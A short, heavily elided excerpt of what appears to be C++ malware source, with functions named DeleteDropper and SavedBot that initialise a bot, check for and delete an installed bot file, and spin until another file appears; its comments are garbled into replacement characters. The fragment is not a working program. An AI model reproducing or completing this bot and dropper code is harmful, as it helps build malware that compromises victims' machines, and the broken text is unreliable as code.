...
DWORD WINAPI DeleteDropper(LPVOID) // ������� �������, ������� ����
{
	BOT::Initialize();
	DebugReportInit();
...
static bool SavedBot( BYTE* bodyBotPlug, DWORD sizeBotPlug )
{
	...
	if( File::IsExists(path.t_str()) ) //� ������������ ���� ���, ���������
	{
		...
		//�������
		/*
		pSetFileAttributesA( path.t_str(), FILE_ATTRIBUTE_NORMAL ); //������� ������� ��� ������
		if( pDeleteFileA(path.t_str()) == 0 ) //���� �� ��������, �� ������ ����� ����� ������ ��������
		{
...
*/
	...
	if (  bRet == FALSE )
	{
		...
		while ( ( (DWORD)pGetFileAttributesA(PathBkFile) == INVALID_FILE_ATTRIBUTES) );	//	end do, ���� ���� �� �������� ���� �������
